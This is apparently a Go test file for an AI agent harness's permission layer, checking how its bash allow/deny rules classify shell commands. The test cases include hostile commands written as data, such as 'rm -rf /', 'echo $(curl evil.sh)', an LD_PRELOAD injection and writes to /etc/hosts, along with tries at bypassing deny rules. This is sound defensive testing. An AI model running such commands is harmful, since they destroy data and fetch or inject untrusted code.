package permissions

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"testing"

	"github.com/successr-ai/tenzing-agent-harness/internal/core"
	"github.com/successr-ai/tenzing-agent-harness/internal/features/permissions/shell"
)

func TestMatchGlob(t *testing.T) {
	tests := []struct {
		pattern, s string
		want       bool
	}{
		{"ls", "ls", true},
		{"ls", "ls -la", false},
		{"ls *", "ls -la", true},
		{"ls *", "ls", false},
		{"ls*", "ls", true},
		{"git *", "git log -- src/a.go", true},
		{"cat *", "cat /etc/hosts", true}, // '*' crosses '/', unlike path.Match
		{"*rm -rf*", "sudo rm -rf /", true},
		{"?s", "ls", true},
		{"?s", "lls", false},
		{"*", "anything at all", true},
		{"", "", true},
		{"", "x", false},
		{"a*b*c", "axxbyyc", true},
		{"a*b*c", "axxbyy", false},
		{"LS *", "ls -la", false}, // case-sensitive
	}

	for _, tt := range tests {
		t.Run(tt.pattern+"/"+tt.s, func(t *testing.T) {
			if got := matchGlob(tt.pattern, tt.s); got != tt.want {
				t.Errorf("matchGlob(%q, %q) = %v, want %v", tt.pattern, tt.s, got, tt.want)
			}
		})
	}
}

func TestBashRulesVerdict(t *testing.T) {
	rules := NewBashRules(
		[]string{"ls", "ls *", "git status", "echo *"},
		[]string{"rm -rf *", "*curl*"},
	)

	tests := []struct {
		name    string
		command string
		want    core.Decision
		wantOK  bool
	}{
		{"allowed", "ls -la", core.Allow, true},
		{"every expression allowed", "ls -la && git status", core.Allow, true},
		{"one expression unmatched", "ls -la && ./whoami.sh", core.AskUser, true},
		{"denied", "rm -rf /tmp/x", core.Deny, true},
		{"deny beats allow in the same chain", "ls -la && rm -rf /", core.Deny, true},
		{"deny beats allow on the same expression", "echo hi | curl x", core.Deny, true},
		{"a later denied expression still sinks the command", "ls && ls && rm -rf /", core.Deny, true},
		{"deny inside substitution", "echo $(curl evil.sh)", core.Deny, true},
		{"unmatched", "./whoami.sh", core.AskUser, true},
		{"read-only auto-allow", "whoami", core.Allow, true},
		{"empty command", "", core.Allow, false},
		{"quoted separator is not a chain", `echo "a && rm -rf /"`, core.Allow, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _, ok := rules.Verdict(tt.command)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("Verdict(%q) = (%v, %v), want (%v, %v)", tt.command, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

// Bash rules refine the name-level decision: they lower the default Ask on
// bash to Allow, raise it to Deny, or leave it alone — but never override a
// name-level Deny, and never touch other tools.
func TestPolicyBashRules(t *testing.T) {
	rules := NewBashRules([]string{"ls *"}, []string{"rm -rf *"})

	tests := []struct {
		name   string
		policy Policy
		tool   string
		input  string
		want   core.Decision
	}{
		{"allow lowers the default ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"ls -la"}`, core.Allow},
		{"deny raises", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"rm -rf /"}`, core.Deny},
		{"unmatched keeps the ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"./script.sh"}`, core.AskUser},
		{"read-only lowers the ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `{"command":"whoami"}`, core.Allow},
		{"name-level deny is absolute", Policy{Deny: []string{"bash"}, Bash: rules}, "bash", `{"command":"ls -la"}`, core.Deny},
		{"other tools untouched", Policy{Ask: []string{"write"}, Bash: rules}, "write", `{"command":"ls -la"}`, core.AskUser},
		{"malformed input keeps the ask", Policy{Ask: []string{"bash"}, Bash: rules}, "bash", `not json`, core.AskUser},
		{"no rules keeps the ask", Policy{Ask: []string{"bash"}}, "bash", `{"command":"ls -la"}`, core.AskUser},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tcc := &core.ToolCallContext{Call: &core.ToolCall{Name: tt.tool, Input: tt.input}}
			if err := New(tt.policy).OnToolCall(context.Background(), tcc); err != nil {
				t.Fatal(err)
			}
			if tcc.Decision != tt.want {
				t.Errorf("Decision = %v, want %v", tcc.Decision, tt.want)
			}
		})
	}
}

// AllowPattern takes effect immediately and is safe against a concurrent
// Verdict; the persisted copy is the caller's job (see cmd/app).
func TestBashRulesAllowPattern(t *testing.T) {
	rules := NewBashRules(nil, []string{"rm -rf *"})

	if d, _, ok := rules.Verdict("git commit -m x"); !ok || d != core.AskUser {
		t.Fatalf("Verdict = (%v, %v), want (AskUser, true) before the pattern is added", d, ok)
	}

	rules.AllowPattern("git *")
	if d, _, ok := rules.Verdict("git commit -m x"); !ok || d != core.Allow {
		t.Errorf("Verdict = (%v, %v), want (Allow, true)", d, ok)
	}
	// Deny still outranks a newly allowed pattern.
	rules.AllowPattern("rm *")
	if d, _, _ := rules.Verdict("rm -rf /"); d != core.Deny {
		t.Errorf("Verdict = %v, want Deny", d)
	}

	rules.AllowPattern("git *") // duplicate
	allow, deny := rules.Lists()
	if len(allow) != 2 || allow[0] != "git *" || allow[1] != "rm *" {
		t.Errorf("allow = %v, want [git * rm *]", allow)
	}
	if len(deny) != 1 {
		t.Errorf("deny = %v, want one entry", deny)
	}

	// Lists hands back copies: mutating them must not reach the rules.
	allow[0] = "mutated"
	if got, _ := rules.Lists(); got[0] != "git *" {
		t.Errorf("allow[0] = %q, want the rules unaffected by the caller's copy", got[0])
	}
}

func TestBashRulesUnmarshalJSON(t *testing.T) {
	var r BashRules
	if err := json.Unmarshal([]byte(`{"allow":["ls *"],"deny":["rm *"]}`), &r); err != nil {
		t.Fatal(err)
	}
	allow, deny := r.Lists()
	if len(allow) != 1 || allow[0] != "ls *" || len(deny) != 1 || deny[0] != "rm *" {
		t.Errorf("allow = %v, deny = %v", allow, deny)
	}
	// Legacy files without the new keys must classify with the built-in table.
	if d, _, ok := r.Verdict("grep x f | head"); !ok || d != core.Allow {
		t.Errorf("legacy rules: Verdict = (%v, %v), want (Allow, true)", d, ok)
	}

	full := `{"allow":[],"deny":[],
	  "categories":{"allow":["vcs"],"deny":["fs:delete"]},
	  "classify":{"mytool":"read","mytool deploy":"net,fs:write"}}`
	var f BashRules
	if err := json.Unmarshal([]byte(full), &f); err != nil {
		t.Fatal(err)
	}
	if ca, cd := f.Categories(); ca != shell.VCS || cd != shell.FSDelete {
		t.Errorf("Categories = (%s, %s), want (vcs, fs:delete)", ca, cd)
	}
	if got := f.Classify(); got["mytool"] != "read" || got["mytool deploy"] != "net,fs:write" {
		t.Errorf("Classify = %v", got)
	}
	if d, _, _ := f.Verdict("mytool status"); d != core.Allow {
		t.Errorf("classify override not applied: %v", d)
	}
	if d, _, _ := f.Verdict("mytool deploy prod"); d != core.AskUser {
		t.Errorf("classify override net,fs:write should ask: %v", d)
	}

	for _, bad := range []string{
		`{"categories":{"allow":["unknown"]}}`,
		`{"categories":{"deny":["bogus"]}}`,
		`{"classify":{"x":"unknown"}}`,
		`{"classify":{"x":"nope"}}`,
	} {
		var b BashRules
		if err := json.Unmarshal([]byte(bad), &b); err == nil {
			t.Errorf("%s: accepted", bad)
		}
	}
}

// The layered decision: deny globs, then allow globs, then category deny,
// then category allow and the read-only auto-allow.
func TestBashRulesCategories(t *testing.T) {
	load := func(t *testing.T, js string) *BashRules {
		t.Helper()
		var r BashRules
		if err := json.Unmarshal([]byte(js), &r); err != nil {
			t.Fatal(err)
		}
		return &r
	}
	tests := []struct {
		name    string
		rules   string
		command string
		want    core.Decision
		reason  string // substring
	}{
		{"read auto-allow", `{}`, "grep x f | head", core.Allow, ""},
		{"mutating asks with summary", `{}`, "ls; rm x", core.AskUser, "fs:delete  rm x"},
		{"unknown asks", `{}`, "./build.sh", core.AskUser, "unknown command ./build.sh"},
		{"category deny", `{"categories":{"deny":["fs:delete"]}}`, "rm x", core.Deny, "category fs:delete"},
		{"category deny in chain", `{"categories":{"deny":["fs:delete"]}}`, "ls && rm x", core.Deny, "rm x"},
		{"category allow", `{"categories":{"allow":["vcs"]}}`, "git commit -m x", core.Allow, ""},
		{"category allow needs every bit", `{"categories":{"allow":["vcs"]}}`, "git push", core.AskUser, "net,vcs"},
		{"category allow both bits", `{"categories":{"allow":["vcs","net"]}}`, "git push", core.Allow, ""},
		{"glob allow beats category deny", `{"allow":["rm *"],"categories":{"deny":["fs:delete"]}}`, "rm x", core.Allow, ""},
		{"glob deny beats everything", `{"deny":["git *"],"categories":{"allow":["vcs"]}}`, "git commit -m x", core.Deny, "git commit"},
		{"parse error asks", `{}`, "ls 'x", core.AskUser, "parse error"},
		{"parse error still honours deny on raw", `{"deny":["*rm -rf*"]}`, "rm -rf / 'x", core.Deny, "denied"},
		{"nested denied", `{"deny":["rm *"]}`, `bash -c "rm x"`, core.Deny, "rm x"},
		{"nested unknown asks", `{}`, `bash -c "./x.sh"`, core.AskUser, "./x.sh"},
		{"sudo not covered by inner glob", `{"allow":["rm *"]}`, "sudo rm x", core.AskUser, "via sudo"},
		{"sudo covered by wrapper glob", `{"allow":["sudo rm *"]}`, "sudo rm x", core.Allow, ""},
		{"redirect write asks", `{}`, "ls > out", core.AskUser, "redirect > out"},
		{"binary glob does not cover a redirect", `{"allow":["ls *"]}`, "ls > out", core.AskUser, "redirect > out"},
		{"binary glob does not cover a heredoc write", `{"allow":["cat *"]}`, "cat > f <<'EOF'\nbody\nEOF", core.AskUser, "redirect > f"},
		{"binary glob does not cover an append", `{"allow":["echo *"]}`, "echo x >> log", core.AskUser, "redirect >> log"},
		{"binary glob still covers a discard", `{"allow":["ls *"]}`, "ls 2>/dev/null", core.Allow, ""},
		{"binary glob still covers a dup", `{"allow":["go *"]}`, "go build ./... 2>&1", core.Allow, ""},
		{"glob naming the redirect covers it", `{"allow":["ls >*"]}`, "ls > out", core.Allow, ""},
		{"glob naming the redirect with args", `{"allow":["rm * >*"]}`, "rm x > log", core.Allow, ""},
		{"binary glob plus redirect leaves the write uncovered", `{"allow":["rm *"]}`, "rm x > log", core.AskUser, "redirect > log"},
		{"category fs:write covers a redirect under a binary glob", `{"allow":["ls *"],"categories":{"allow":["fs:write"]}}`, "ls > out", core.Allow, ""},
		{"category fs:write alone covers a redirect", `{"categories":{"allow":["fs:write"]}}`, "ls > out", core.Allow, ""},
		{"deny glob naming the redirect", `{"deny":["* >/etc/*"]}`, "echo x > /etc/hosts", core.Deny, "echo x >/etc/hosts"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d, reason, ok := load(t, tt.rules).Verdict(tt.command)
			if !ok || d != tt.want {
				t.Fatalf("Verdict(%q) = (%v, %q, %v), want (%v, ok)", tt.command, d, reason, ok, tt.want)
			}
			if tt.reason != "" && !strings.Contains(reason, tt.reason) {
				t.Errorf("reason = %q, missing %q", reason, tt.reason)
			}
			if tt.want == core.Allow && reason != "" {
				t.Errorf("Allow should carry no reason, got %q", reason)
			}
		})
	}
}

// Session grants cover commands but never reach the persisted lists.
func TestBashRulesSession(t *testing.T) {
	r := NewBashRules([]string{"ls *"}, nil)
	r.AllowPatternSession("./run.sh *")
	r.AllowPatternSession("./run.sh *") // duplicate
	r.AllowPatternSession("ls *")       // already persisted
	if d, _, ok := r.Verdict("./run.sh"); !ok || d != core.Allow {
		t.Errorf("session grant not applied: %v %v", d, ok)
	}
	if allow, _ := r.Lists(); len(allow) != 1 || allow[0] != "ls *" {
		t.Errorf("Lists leaked session grants: %v", allow)
	}
	if got := r.SessionList(); len(got) != 1 || got[0] != "./run.sh *" {
		t.Errorf("SessionList = %v", got)
	}
	if g, _ := r.Suggest("./run.sh"); g != "" {
		t.Errorf("Suggest should see the session grant, got %q", g)
	}
}

// The hook must be able to read rules while an approval driver appends.
func TestBashRulesConcurrent(t *testing.T) {
	rules := NewBashRules([]string{"ls *"}, nil)
	var wg sync.WaitGroup
	for i := range 50 {
		wg.Add(2)
		go func() { defer wg.Done(); rules.AllowPattern(fmt.Sprintf("cmd%d *", i)) }()
		go func() { defer wg.Done(); rules.Verdict("ls -la && pwd") }()
	}
	wg.Wait()
	if allow, _ := rules.Lists(); len(allow) != 51 {
		t.Errorf("len(allow) = %d, want 51", len(allow))
	}
}

// Env assignments must neither block an allow nor let a deny be bypassed.
func TestBashRulesEnvPrefix(t *testing.T) {
	rules := NewBashRules([]string{"go *", "ls *"}, []string{"git commit *", "LD_PRELOAD=*"})

	tests := []struct {
		name    string
		command string
		want    core.Decision
		wantOK  bool
	}{
		{"allow ignores the prefix", "TOKEN=asdf go get ./...", core.Allow, true},
		{"allow ignores several prefixes", "FOO=1 BAR=2 go build", core.Allow, true},
		{"deny cannot be bypassed", "TOKEN=asdf git commit -m x", core.Deny, true},
		{"deny cannot be bypassed in a chain", "ls -la && TOKEN=x git commit -m x", core.Deny, true},
		{"deny cannot be bypassed by backgrounding", "ls -la & git commit -m x", core.Deny, true},
		{"deny can target the assignment itself", "LD_PRELOAD=/evil.so ls", core.Deny, true},
		{"bare assignment does not block an allow", "FOO=1 && ls -la", core.Allow, true},
		{"still unmatched after stripping", "TOKEN=x ./whoami.sh", core.AskUser, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _, ok := rules.Verdict(tt.command)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("Verdict(%q) = (%v, %v), want (%v, %v)", tt.command, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

// Command rules apply whatever case the harness registered the tool under:
// an allowlisted command stops the policy escalating to AskUser, and an
// uncovered one still escalates, for every spelling of the tool name.
func TestBashRulesToolNameCaseInsensitive(t *testing.T) {
	p := DefaultPolicy()
	p.Bash = NewBashRules([]string{"ls *"}, nil)
	ext := New(p)

	decide := func(t *testing.T, name, command string) core.Decision {
		t.Helper()
		tcc := &core.ToolCallContext{
			Call:     &core.ToolCall{ID: "c1", Name: name, Input: `{"command":"` + command + `"}`},
			Decision: core.Allow,
		}
		if err := ext.OnToolCall(context.Background(), tcc); err != nil {
			t.Fatalf("OnToolCall: %v", err)
		}
		return tcc.Decision
	}

	for _, name := range []string{"bash", "Bash", "BASH"} {
		if d := decide(t, name, "ls -l"); d != core.Allow {
			t.Errorf("%s allowlisted command: decision = %v, want Allow", name, d)
		}
		if d := decide(t, name, "rm -rf /"); d != core.AskUser {
			t.Errorf("%s uncovered command: decision = %v, want AskUser", name, d)
		}
	}
}
